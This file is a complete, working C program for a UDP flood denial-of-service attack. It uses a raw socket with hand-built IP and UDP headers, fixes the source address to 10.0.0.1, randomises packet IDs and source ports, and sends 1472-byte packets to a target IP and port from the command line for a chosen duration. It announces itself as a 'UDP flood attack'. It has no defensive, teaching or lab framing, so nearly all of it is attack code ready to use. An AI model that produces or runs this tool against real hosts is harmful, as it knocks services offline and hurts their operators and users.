#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <time.h>

unsigned short checksum(void *b, int len)
{
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

void flood(char *target_ip, int target_port, int duration)
{
    int sock;
    struct sockaddr_in target;
    char packet[4096];
    struct iphdr *ip = (struct iphdr *)packet;
    struct udphdr *udp = (struct udphdr *)(packet + sizeof(struct iphdr));
    char *data = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
    int packet_size;
    time_t start_time;
    int count = 0;
    int optval = 1;

    sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0)
    {
        perror("socket");
        exit(1);
    }

    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval)) < 0)
    {
        perror("setsockopt");
        exit(1);
    }

    target.sin_family = AF_INET;
    target.sin_port = htons(target_port);
    target.sin_addr.s_addr = inet_addr(target_ip);

    srand(time(NULL));

    start_time = time(NULL);

    while (time(NULL) - start_time < duration)
    {
        memset(packet, 0, sizeof(packet));

        ip->ihl = 5;
        ip->version = 4;
        ip->tos = 0;
        ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + 1472);
        ip->id = htons(rand() % 65535);
        ip->frag_off = 0;
        ip->ttl = 64;
        ip->protocol = IPPROTO_UDP;
        ip->check = 0;
        ip->saddr = inet_addr("10.0.0.1");
        ip->daddr = target.sin_addr.s_addr;

        udp->source = htons(rand() % 65535);
        udp->dest = htons(target_port);
        udp->len = htons(sizeof(struct udphdr) + 1472);
        udp->check = 0;

        memset(data, 'X', 1472);

        ip->check = checksum((unsigned short *)ip, sizeof(struct iphdr));

        packet_size = sizeof(struct iphdr) + sizeof(struct udphdr) + 1472;

        if (sendto(sock, packet, packet_size, 0, (struct sockaddr *)&target, sizeof(target)) < 0)
        {
            perror("sendto");
        }
        else
        {
            count++;
        }

        if (count % 10000 == 0)
        {
            printf("Sent: %d packets\r", count);
            fflush(stdout);
        }
    }

    printf("\nSent %d packets to %s:%d\n", count, target_ip, target_port);
    close(sock);
}

int main(int argc, char *argv[])
{
    if (argc != 4)
    {
        printf("Usage: %s <target_ip> <target_port> <duration_seconds>\n", argv[0]);
        return 1;
    }

    printf("Starting UDP flood attack\n");
    printf("Target: %s:%d\n", argv[1], atoi(argv[2]));
    printf("Duration: %s seconds\n", argv[3]);
    printf("Press Ctrl+C to stop\n\n");

    flood(argv[1], atoi(argv[2]), atoi(argv[3]));

    return 0;
}
